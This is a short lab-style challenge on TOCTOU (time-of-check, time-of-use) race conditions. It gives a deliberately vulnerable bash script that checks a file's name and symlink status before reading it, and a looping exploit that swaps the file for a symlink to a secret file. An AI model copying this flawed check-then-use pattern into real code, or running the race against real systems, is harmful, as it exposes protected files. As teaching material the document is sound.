TOCTOU = Time Of Check, Time Of Use
====================================

In many situation, there is a check for an object (exist, permissions, ...) and later, that object is used.
The time between the check and the use is an opportunity window for the attacker. 

Goal of that challenge: create a reliable way of exploitation


Create secret
=============
echo "secret message: for your eyes only"> secret.txt

Vuln code
=========

#!/bin/bash

file="$1"
# Check if the file contains "secret"
if [[ "$file" != *"secret"* ]]; then
    # Check if the file is a symlink
    if [ ! -h "$file" ]; then
        # < EXPLOITABLE WINDOW >
        cat "$file"
    else
        echo "Error: File is a symlink."
    fi
else
    echo "Error: File may not contain 'secret'."
fi


Dumb exploitation
=================
In terminal 1: $ while true; do ./read.sh file; done

In terminal 2:
while true; do 
    echo 'Hello, world!' > file
    rm file
    ln -s /secret file
    rm file
done
